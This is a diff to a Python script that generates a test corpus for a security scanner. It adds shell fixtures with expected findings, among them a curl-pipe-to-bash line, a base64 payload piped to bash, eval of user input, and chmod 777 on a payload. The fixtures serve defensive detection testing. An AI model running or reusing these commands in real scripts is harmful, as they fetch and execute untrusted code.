@@ -27,6 +27,7 @@ NOTEBOOK_DIR = os.path.join(CORPUS_DIR, 'notebook')
 DISGUISED_DIR = os.path.join(CORPUS_DIR, 'disguised')
 PDF_DIR    = os.path.join(CORPUS_DIR, 'pdf')
 OFFICE_DIR = os.path.join(CORPUS_DIR, 'office')
+SHELL_DIR  = os.path.join(CORPUS_DIR, 'shell')
 os.makedirs(PYTHON_DIR, exist_ok=True)
 os.makedirs(NATIVE_DIR, exist_ok=True)
 os.makedirs(PYSRC_DIR, exist_ok=True)
@@ -34,6 +35,7 @@ os.makedirs(NOTEBOOK_DIR, exist_ok=True)
 os.makedirs(DISGUISED_DIR, exist_ok=True)
 os.makedirs(PDF_DIR, exist_ok=True)
 os.makedirs(OFFICE_DIR, exist_ok=True)
+os.makedirs(SHELL_DIR, exist_ok=True)
 
 RANDOM_SEED   = 13371337
 FIXED_ZIP_DT  = (2026, 1, 1, 0, 0, 0)
@@ -234,7 +236,7 @@ clean_py = (
     'def add(a, b):\n'
     '    return a + b\n'
 )
-write_text = lambda p, s: (open(p, 'w', encoding='utf-8').write(s), print(f'  wrote {p}'))[1]
+write_text = lambda p, s: (open(p, 'w', encoding='utf-8', newline='\n').write(s), print(f'  wrote {p}'))[1]
 write_text(os.path.join(PYSRC_DIR, 'clean.py'), clean_py)
 
 # Risky code — Bandit B307 (eval, MEDIUM) + B602 (subprocess shell=True, HIGH)
@@ -385,6 +387,51 @@ write_docx('office_template.docx', _DOC_BODY, {
 })
 
 # ─────────────────────────────────────────────────────────────────────────────
+# Shell script fixtures (v0.4)
+# ─────────────────────────────────────────────────────────────────────────────
+write_text(os.path.join(SHELL_DIR, 'clean.sh'),
+    '#!/bin/bash\n'
+    'set -euo pipefail\n'
+    'name="$1"\n'
+    'echo "Hello, ${name}"\n')
+
+write_text(os.path.join(SHELL_DIR, 'remote_exec.sh'),
+    '#!/bin/bash\n'
+    'curl https://example.test/install.sh | bash\n')
+
+write_text(os.path.join(SHELL_DIR, 'b64_exec.sh'),
+    '#!/bin/bash\n'
+    'echo "cGF5bG9hZAo=" | base64 -d | bash\n')
+
+write_text(os.path.join(SHELL_DIR, 'eval_expand.sh'),
+    '#!/bin/bash\n'
+    'USER_INPUT="$1"\n'
+    'eval "$USER_INPUT"\n')
+
+write_text(os.path.join(SHELL_DIR, 'chmod777.sh'),
+    '#!/bin/bash\n'
+    'chmod 777 /tmp/payload\n'
+    './tmp/payload\n')
+
+write_text(os.path.join(SHELL_DIR, 'hardcoded_ip.sh'),
+    '#!/bin/bash\n'
+    'SERVER=192.168.1.100\n'
+    'curl http://$SERVER/data\n')
+
+# sc_bugs.sh — shell code ShellCheck RELIABLY flags as errors/warnings:
+#   SC2086: unquoted variable in echo and test
+#   SC2050: comparing string with -eq
+#   SC2006: use $(...) instead of backticks
+write_text(os.path.join(SHELL_DIR, 'sc_bugs.sh'),
+    '#!/bin/bash\n'
+    'var="hello world"\n'
+    'echo $var\n'                     # SC2086: double quote to prevent globbing
+    'count=`ls | wc -l`\n'            # SC2006: use $(...) not backticks
+    'if [ "$count" -eq 0 ]; then\n'
+    '  echo "empty"\n'
+    'fi\n')
+
+# ─────────────────────────────────────────────────────────────────────────────
 # Manifest
 # ─────────────────────────────────────────────────────────────────────────────
 manifest = {
@@ -421,6 +468,13 @@ manifest = {
         "office/office_macro.docm":    {"expectFinding": "OFFICE-VBA-PRESENT"},
         "office/office_dde.docx":      {"expectFinding": "OFFICE-DDE"},
         "office/office_template.docx": {"expectFinding": "OFFICE-REMOTE-TEMPLATE"},
+        "shell/clean.sh":       {"expectRiskyCode": False},
+        "shell/remote_exec.sh": {"expectFinding": "SHELL-REMOTE-EXEC"},
+        "shell/b64_exec.sh":    {"expectFinding": "SHELL-B64-EXEC"},
+        "shell/eval_expand.sh": {"expectFinding": "SHELL-EVAL"},
+        "shell/chmod777.sh":    {"expectFinding": "SHELL-CHMOD-777"},
+        "shell/hardcoded_ip.sh":{"expectFinding": "SHELL-HARDCODED-IP"},
+        "shell/sc_bugs.sh":     {"expectShellCheckFindings": True},
     }
 }
 with open(os.path.join(CORPUS_DIR, 'manifest.json'), 'w') as f:
